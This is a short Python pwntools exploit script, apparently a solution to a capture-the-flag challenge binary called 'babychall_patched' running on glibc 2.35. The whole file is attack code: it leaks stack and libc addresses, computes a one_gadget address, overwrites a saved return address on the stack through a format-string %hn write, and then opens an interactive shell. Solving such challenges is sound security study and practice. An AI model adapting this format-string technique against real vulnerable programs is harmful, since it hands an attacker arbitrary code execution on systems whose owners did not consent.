```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./babychall_patched")
libc = ELF("./libc6_2.35-0ubuntu3.5_amd64.so")
ld = ELF("./ld-2.35.so")

context.binary = exe


p = process([exe.path])
gdb.attach(p, gdbscript = '''
b*vuln+103
b*vuln+132
c
''')

input()

p.sendline(b'1')
p.recvuntil(b'>> ')

stack = int(p.recv(15)[:-1], 16) + 0x38
print(hex(stack))
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x7f380
print(hex(libc_leak))
print(hex(libc.address))

# 0x50a47 0xebc81 0xebc85 0xebc88 0xebce2 0xebd3f 0xebd43
one_gadet = libc.address + 0x50a47
print(hex(one_gadet))
for i in range(2):
    payload = f'%{one_gadet & 0xffff}c%8$hn'.encode()
    payload = payload.ljust(0x10)
    payload += p64(stack + i * 2)
    p.sendline(b'2')
    p.sendline(payload)
    one_gadet = one_gadet >> 16
    print(hex(one_gadet))

p.sendline(b'3')



p.interactive()
```
